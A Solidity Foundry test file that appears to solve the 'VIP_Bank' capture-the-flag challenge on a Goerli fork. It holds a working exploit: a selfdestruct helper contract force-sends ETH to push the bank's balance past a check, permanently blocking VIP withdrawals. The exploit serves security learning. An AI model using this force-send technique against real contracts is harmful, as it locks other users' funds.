// SPDX-License-Identifier: None
pragma solidity 0.8.7;

import { Test } from "forge-std/Test.sol";
import { VIP_Bank } from "../src/VIPBank.sol";

/**
 * @title   Answer to the VIP_Bank Challenge
 * @notice  Withdraw reverts if the contract balance is >0.5eth
 *          require(address(this).balance <= maxETH, "Cannot withdraw more than 0.5 ETH per transaction");
 *          As there is no receive or fallback, this test first force send 0.5eth+1wei to the contract,
 *          using selfdestruct then test if VIP cannot withdraw anymore.
 * @dev     Forking Goerli
 * @author  DrGorilla.eth
 */
contract ConfidentialTest is Test {
    VIP_Bank _contract;

    // The VIP address which is going to loose money...
    address _VIP = makeAddr("VIP");

    function setUp() public {
        // Fork Goerli, to use the correct instance
        vm.createSelectFork('https://rpc.ankr.com/eth_goerli');
        _contract = VIP_Bank(0x28e42E7c4bdA7c0381dA503240f2E54C70226Be2);

        // Fund the VIP account
        vm.deal(_VIP, 0.1 ether);
    }

    function testSolution_UserCannotWithdraw() public {
        uint256 _balanceContractBefore = payable(address(_contract)).balance;

        // Prank the manager to add a test VIP
        vm.prank(0xE48A248367d3BC49069fA01A26B7517756E32a52);
        _contract.addVIP(_VIP);

        // The VIP deposit 0.05eth (the max allowed)
        vm.prank(_VIP);
        _contract.deposit{value: 0.05 ether}();

        // Force send 0.5eth + 1 wei to the contract, using selfdestruct
        ForceSender _sender = new ForceSender{value: 0.5 ether + 1}();
        _sender.forceSend(payable(address(_contract)));

        // Check: is the contract balance >0.5eth (test of relative balance, as people
        // have been doing it on the contract deployed on Goerli...)
        assertTrue(payable(address(_contract)).balance > _balanceContractBefore + 0.5 ether);

        // Check: VIP cannot withdraw anymore
        vm.prank(_VIP);
        vm.expectRevert();
        _contract.withdraw(0.1 ether);
    }
}

contract ForceSender {
    constructor() payable {}

    function forceSend(address payable _to) public {
        selfdestruct(_to);
    }
}